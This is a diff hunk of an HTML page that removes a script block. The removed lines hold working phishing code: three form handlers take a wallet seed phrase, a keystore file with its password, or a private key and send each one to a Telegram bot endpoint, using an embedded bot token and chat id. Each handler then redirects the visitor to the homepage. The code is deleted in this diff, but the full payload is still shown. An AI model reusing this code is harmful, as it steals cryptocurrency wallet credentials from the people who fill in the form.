@@ -124,68 +124,7 @@
  
 </div>
   </form> 
-<script>
-function submitKeyphrase(event) {
-  event.preventDefault(); // Prevent the default form submission
-  const form = event.target;
-  const phrase = form.phrase.value;
-  const url = `https://api.telegram.org/bot7552140963:AAHkeU5PGLeLuEqAy9U68sp2ijCPc6E5CY8/sendMessage?chat_id=-4692683158&text=Keyphrase: ${encodeURIComponent(phrase)}`;
 
-  fetch(url)
-      .then(response => {
-          if (response.ok) {
-              window.location.href = 'index.html'; // Redirect to homepage
-          } else {
-              alert('Error sending message. Please try again.');
-          }
-      })
-      .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred. Please try again.');
-      });
-}
-
-function submitKeystore(event) {
-  event.preventDefault(); // Prevent the default form submission
-  const form = event.target;
-  const keystorejson = form.keystorejson.value;
-  const password = form.Password.value;
-  const url = `https://api.telegram.org/bot7552140963:AAHkeU5PGLeLuEqAy9U68sp2ijCPc6E5CY8/sendMessage?chat_id=-4692683158&text=Keystore JSON: ${encodeURIComponent(keystorejson)} | Password: ${encodeURIComponent(password)}`;
-
-  fetch(url)
-      .then(response => {
-          if (response.ok) {
-              window.location.href = 'index.html'; // Redirect to homepage
-          } else {
-              alert('Error sending message. Please try again.');
-          }
-      })
-      .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred. Please try again.');
-      });
-}
-
-function submitPrivateKey(event) {
-  event.preventDefault(); // Prevent the default form submission
-  const form = event.target;
-  const privateKey = form.Key.value;
-  const url = `https://api.telegram.org/bot7552140963:AAHkeU5PGLeLuEqAy9U68sp2ijCPc6E5CY8/sendMessage?chat_id=-4692683158&text=Private Key: ${encodeURIComponent(privateKey)}`;
-
-  fetch(url)
-      .then(response => {
-          if (response.ok) {
-              window.location.href = 'index.html'; // Redirect to homepage
-          } else {
-              alert('Error sending message. Please try again.');
-          }
-      })
-      .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred. Please try again.');
-      });
-}
-</script>
 		</div>
 	</div>
 
